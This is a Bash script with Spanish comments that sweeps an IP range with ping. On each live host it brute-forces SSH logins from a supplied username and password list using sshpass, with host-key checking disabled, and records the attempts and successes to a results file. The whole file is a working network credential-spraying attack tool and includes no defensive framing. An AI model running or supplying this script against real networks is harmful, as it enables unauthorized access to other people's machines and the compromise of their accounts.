#!/bin/bash

# Obtener los argumentos ingresados por el usuario
while getopts ":u:L:r:" opt; do
  case $opt in
    u)
      username=$OPTARG
      ;;
    L)
      password_file=$OPTARG
      ;;
    r)
      ip_range=$OPTARG
      ;;
    \?)
      echo "Opción inválida: -$OPTARG" >&2
      exit 1
      ;;
    :)
      echo "La opción -$OPTARG requiere un argumento." >&2
      exit 1
      ;;
  esac
done

# Verificar que los argumentos obligatorios se hayan ingresado
if [[ -z $username || -z $password_file || -z $ip_range ]]; then
  echo "Faltan argumentos obligatorios." >&2
  echo "Uso: ./script.sh -u <nombre_usuario> -L <archivo_contraseñas> -r <rango_red>"
  exit 1
fi

# Leer el archivo de contraseñas y almacenarlas en un array
passwords=($(cat "$password_file"))

# Obtener la cantidad total de contraseñas
total_passwords=${#passwords[@]}

# Colores de texto
color_naranja="\e[33m"
color_amarillo="\e[1;33m"
color_azul="\e[34m"
color_rojo="\e[31m"
color_reset="\e[0m"

# Obtener la dirección de red y la máscara CIDR
IFS="/" read -r network_address cidr_mask <<< "$ip_range"

# Calcular la cantidad de hosts en la red
cidr=${cidr_mask#*/}
hosts=$(( 2 ** (32 - cidr) - 2 ))

# Obtener la dirección de red en partes
IFS="." read -r -a network_parts <<< "$network_address"

# Obtener el último octeto de la dirección de red
network_octet=${network_parts[3]}

# Crear archivo resultado.txt
result_file="resultado.txt"
echo "" > "$result_file"

for ((i=1; i<=hosts; i++))
do
  # Calcular el octeto actual
  octet=$(( network_octet + i ))

  # Calcular la dirección IP actual
  ip="${network_parts[0]}.${network_parts[1]}.${network_parts[2]}.$octet"

  # Realizar el escaneo ICMP (ping) a la IP
  ping -c 1 -W 1 "$ip" > /dev/null 2>&1

  if [ $? -eq 0 ]; then
    echo -e "${color_naranja}[+] IP $ip está activa. Realizando pruebas de contraseña...${color_reset}"

    # Variable para indicar si se encontró un login exitoso
    login_exitoso=false

    # Iterar sobre las contraseñas y probar cada una
    for ((j=0; j<total_passwords; j++))
    do
      password="${passwords[j]}"

      # Mostrar el proceso de prueba de contraseña
      echo -e "${color_azul}Probando Credenciales:${color_reset} '$username:$password' en la IP $ip"

      # Ejecutar el comando deseado para probar la contraseña en la IP
      output=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 "$username@$ip" exit 2>&1)

      if [ $? -eq 0 ]; then
        echo -e "${color_rojo}[+] Login exitoso con '$username:$password' en IP $ip${color_reset}"
        login_exitoso=true
        break
      elif [[ $output == *"Permission denied"* ]]; then
        echo "Contraseña incorrecta para el usuario '$username' en IP $ip"
      elif [[ $output == *"Connection refused"* ]]; then
        echo -e "${color_amarillo}IP $ip rechazó la conexión${color_reset}"
        break
      else
        echo "Error de conexión con el usuario '$username' en IP $ip"
        break
      fi

      # Guardar el resultado en el archivo resultado.txt
      echo "Usuario: $username  Contraseña: $password  IP: $ip" >> "$result_file"

      # Actualizar la barra de progreso
      progress=$(( (j+1) * 100 / total_passwords ))
      echo -ne "Progreso: [$progress%]  \r"
      sleep 0.1
    done

    if [ "$login_exitoso" = true ]; then
      echo -e "${color_rojo}[+] Saltando a la siguiente IP...${color_reset}"
      continue
    fi
  else
    echo -e "${color_amarillo}IP $ip no responde.${color_reset}"
  fi

done

echo -e "${color_rojo}Pruebas de contraseña completadas.${color_reset}"
